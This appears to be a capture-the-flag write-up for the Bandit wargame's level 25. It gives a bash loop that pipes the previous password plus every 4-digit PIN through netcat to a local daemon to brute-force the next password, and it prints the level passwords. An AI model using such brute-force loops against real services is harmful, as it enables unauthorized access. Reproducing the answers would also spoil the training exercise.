## Bandit Level 25

## Level goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## Solution
    ```
    for i in {0000..9999};
    do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" | nc -N localhost 30002 | grep -A 2 "Correct"; done 
    ```

    - **do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"** sends the previous level password with every combination of 4 digits to the address specified in the next command
    - **nc -N localhost 30002** opens a communication channel with the process running on the local machine and listening on port 30002
    - **grep -A 2 "Correct"** only print the response for the correct combination, and the next line because the actual password for the next level is one line down

## Password
    - iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

## New concepts learned
    - daemon = a process running in the background
